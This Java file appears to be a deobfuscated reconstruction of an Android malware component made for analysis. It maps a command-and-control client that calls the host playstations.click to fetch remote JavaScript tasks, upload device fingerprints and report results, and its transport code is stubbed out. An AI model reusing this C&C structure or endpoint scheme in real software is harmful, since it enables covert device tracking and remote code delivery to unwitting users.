package api;

import java.util.List;
import model.*;
import org.json.JSONObject;

/**
 * ApiClient — C&C API 客户端
 *
 * Original: IlIllIlllIllI1.llllIIIIll1
 *
 * Provides static methods for all HTTP API calls to the C&C server.
 * All endpoints communicate with: https://playstations.click
 *
 * The API client uses the HttpClient (lIIIIlllllIlll1) for actual HTTP transport,
 * which handles JSON serialization, request signing, and error handling.
 *
 * ┌──────────────────────────────────────────────────────────────────────┐
 * │ C&C Server Endpoint Map                                             │
 * ├──────────────────────────────────────────────────────────────────────┤
 * │ POST /phantom/token              → getToken()                       │
 * │ POST /phantom/task               → getTaskConfig()                  │
 * │ POST /phantom/file_version       → getFileVersion()                 │
 * │ POST /phantom/file               → getFileContent()                 │
 * │ POST /phantom/done               → reportDone()                     │
 * │ POST /h5/upload_logs_v2          → uploadLogs()                     │
 * │ POST /h5/js_file_for_signaling   → getSignalingJS()                 │
 * │ POST /h5/get_job_by_offer        → getJobByOffer()                  │
 * │ POST /h5/report_events           → reportEvents()                   │
 * └──────────────────────────────────────────────────────────────────────┘
 *
 * Static field:
 *   - f242llllIIIIll1 → BASE_URL = "https://playstations.click"
 */
public class ApiClient {

    /** C&C server base URL */
    public static final String BASE_URL = "https://playstations.click";

    /** Platform/channel identifier — always "tc" */
    private static final String PLATFORM = "tc";

    // =========================================================================
    // Auth / Token
    // =========================================================================

    /**
     * Requests an authentication token from the C&C server.
     *
     * Original: IlIllIlllIllI1()
     * Endpoint: POST /phantom/token
     *
     * @return TokenResponse containing the auth token
     * @throws HttpClientException if the request fails
     */
    public static TokenResponse getToken() throws HttpClientException {
        return (TokenResponse) HttpClient.post(
                BASE_URL + "/phantom/token",
                HttpClient.Method.POST,
                buildDeviceAuthRequest(),
                json -> TokenResponse.fromJson(json));
    }

    // =========================================================================
    // Task / Config
    // =========================================================================

    /**
     * Gets the non-signaling task configuration from the C&C server.
     *
     * Original: IlIlllIIlI1()
     * Endpoint: POST /phantom/task
     *
     * @return FileContentResponse containing the task config/JS
     * @throws HttpClientException if the request fails
     */
    public static FileContentResponse getTaskConfig() throws HttpClientException {
        /* Reports analytics event before making the call */
        return (FileContentResponse) HttpClient.post(
                BASE_URL + "/phantom/task",
                HttpClient.Method.POST,
                buildDeviceAuthRequest(),
                json -> FileContentResponse.fromJson(json));
    }

    // =========================================================================
    // File Version / Content
    // =========================================================================

    /**
     * Queries the C&C server for the latest file version.
     *
     * Original: IllIIlIIII1()
     * Endpoint: POST /phantom/file_version
     *
     * @return FileVersionResponse with the current version string
     * @throws HttpClientException if the request fails
     */
    public static FileVersionResponse getFileVersion() throws HttpClientException {
        return (FileVersionResponse) HttpClient.post(
                BASE_URL + "/phantom/file_version",
                HttpClient.Method.POST,
                buildDeviceAuthRequest(),
                json -> FileVersionResponse.fromJson(json));
    }

    /**
     * Downloads file content (JS scripts) from the C&C server.
     *
     * Original: llllIllIl1()
     * Endpoint: POST /phantom/file
     *
     * @return TokenResponse containing the file content
     * @throws HttpClientException if the request fails
     */
    public static TokenResponse getFileContent() throws HttpClientException {
        return (TokenResponse) HttpClient.post(
                BASE_URL + "/phantom/file",
                HttpClient.Method.POST,
                buildDeviceAuthRequest(),
                json -> TokenResponse.fromJson(json));
    }

    // =========================================================================
    // Event / Log Reporting
    // =========================================================================

    /**
     * Uploads event data to the C&C server (batch).
     *
     * Original: lIIIIlllllIlll1(String apiKey, String offerId, List<String> events)
     * Endpoint: POST /h5/upload_logs_v2
     *
     * @param apiKey  the current auth token
     * @param offerId the offer ID
     * @param events  list of event JSON strings to upload
     * @throws HttpClientException if the request fails
     */
    public static void uploadLogs(String apiKey, String offerId, List<String> events)
            throws HttpClientException {
        HttpClient.post(
                BASE_URL + "/h5/upload_logs_v2",
                HttpClient.Method.POST,
                new LogUploadRequest(AppContext.authToken, AppContext.appId,
                        AppContext.deviceId, PLATFORM, apiKey, offerId, events,
                        buildDeviceFingerprint()),
                json -> null);
    }

    /**
     * Gets the signaling JS file from the C&C server.
     *
     * Original: llllIIIIll1(String offerStr)
     * Endpoint: POST /h5/js_file_for_signaling
     *
     * @param offerStr the offer string / identifier
     * @throws HttpClientException if the request fails
     */
    public static Object getSignalingJS(String offerStr) throws HttpClientException {
        return HttpClient.post(
                BASE_URL + "/h5/js_file_for_signaling",
                HttpClient.Method.POST,
                new SignalingJSRequest(offerStr, AppContext.authToken, AppContext.appId,
                        AppContext.deviceId, PLATFORM, buildDeviceFingerprint()),
                json -> json /* parsed by caller */);
    }

    /**
     * Gets a job by offer from the C&C server.
     *
     * Original: llllIIIIll1(String apiKey, String offerId)
     * Endpoint: POST /h5/get_job_by_offer
     *
     * @param apiKey  the current auth token
     * @param offerId the offer ID
     * @throws HttpClientException if the request fails
     */
    public static FileContentResponse getJobByOffer(String apiKey, String offerId)
            throws HttpClientException {
        return (FileContentResponse) HttpClient.post(
                BASE_URL + "/h5/get_job_by_offer",
                HttpClient.Method.POST,
                new JobByOfferRequest(apiKey, offerId, AppContext.authToken, AppContext.appId,
                        AppContext.deviceId, PLATFORM, buildDeviceFingerprint()),
                json -> FileContentResponse.fromJson(json));
    }

    /**
     * Reports task completion (done) to the C&C server.
     *
     * Original: llllIIIIll1(String apiKey, String offerId, String result)
     * Endpoint: POST /phantom/done
     *
     * @param apiKey  the current auth token
     * @param offerId the offer ID
     * @param result  the task result string
     * @throws HttpClientException if the request fails
     */
    public static void reportDone(String apiKey, String offerId, String result)
            throws HttpClientException {
        HttpClient.post(
                BASE_URL + "/phantom/done",
                HttpClient.Method.POST,
                new DoneRequest(AppContext.appId, AppContext.deviceId,
                        AppContext.authToken, apiKey, offerId, result,
                        buildDeviceFingerprint()),
                json -> null);
    }

    /**
     * Reports events to the C&C server (batch).
     *
     * Original: llllIIIIll1(String apiKey, String offerId, List<String> events)
     * Endpoint: POST /h5/report_events
     *
     * @param apiKey  the current auth token
     * @param offerId the offer ID
     * @param events  list of event JSON strings to report
     * @throws HttpClientException if the request fails
     */
    public static void reportEvents(String apiKey, String offerId, List<String> events)
            throws HttpClientException {
        HttpClient.post(
                BASE_URL + "/h5/report_events",
                HttpClient.Method.POST,
                new EventReportRequest(AppContext.authToken, AppContext.appId,
                        AppContext.deviceId, PLATFORM, apiKey, offerId, events,
                        buildDeviceFingerprint()),
                json -> null);
    }

    // =========================================================================
    // Helper: build common request payloads
    // =========================================================================

    /**
     * Builds a DeviceAuthRequest with the current app/device state.
     * Original: lIIIIlllllIlll1()
     */
    private static DeviceAuthRequest buildDeviceAuthRequest() {
        return new DeviceAuthRequest(
                AppContext.appId,
                AppContext.deviceId,
                AppContext.authToken,
                buildDeviceFingerprint());
    }

    /**
     * Builds a DeviceFingerprint from the current device context.
     * Original: llllIIIIll1()
     */
    private static DeviceFingerprint buildDeviceFingerprint() {
        return DeviceFingerprint.collectFromDevice(
                AppContext.getContext(),
                AppContext.appId,
                AppContext.deviceId);
    }

    // =========================================================================
    // Placeholder types
    // =========================================================================

    /*
     * HttpClient (IlIllIlllIllI1.lIIIIlllllIlll1):
     *   - static Object post(String url, Method method, Jsonable body, ResponseParser parser)
     *   - enum Method { POST }
     *   - interface ResponseParser<T> { T parse(JSONObject json); }
     *
     * HttpClientException (IlIllIlllIllI1.lIIIIlllllIlll1.llllIIIIll1):
     *   - extends Exception
     *   - Wraps HTTP errors, network failures, and API errors
     *
     * AppContext (IlIlllIIlI1.lIIIIlllllIlll1):
     *   - static String appId — the host app package name
     *   - static String deviceId — computed device identifier
     *   - static String authToken — current auth token from C&C
     *   - static Context getContext() — app context
     */
    static class HttpClient {
        enum Method { POST }
        interface ResponseParser<T> { T parse(JSONObject json) throws Exception; }
        static <T> T post(String url, Method m, Object body, ResponseParser<T> p)
                throws HttpClientException { return null; }
    }

    static class HttpClientException extends Exception {
        HttpClientException(String msg) { super(msg); }
    }

    static class AppContext {
        static String appId;
        static String deviceId;
        static String authToken;
        static Object getContext() { return null; }
    }

    /* Request body types — thin wrappers around Jsonable */
    static class LogUploadRequest implements Jsonable {
        LogUploadRequest(Object... args) {}
        public JSONObject toJSONObject() { return new JSONObject(); }
    }
    static class SignalingJSRequest implements Jsonable {
        SignalingJSRequest(Object... args) {}
        public JSONObject toJSONObject() { return new JSONObject(); }
    }
    static class JobByOfferRequest implements Jsonable {
        JobByOfferRequest(Object... args) {}
        public JSONObject toJSONObject() { return new JSONObject(); }
    }
    static class DoneRequest implements Jsonable {
        DoneRequest(Object... args) {}
        public JSONObject toJSONObject() { return new JSONObject(); }
    }
    static class EventReportRequest implements Jsonable {
        EventReportRequest(Object... args) {}
        public JSONObject toJSONObject() { return new JSONObject(); }
    }
}
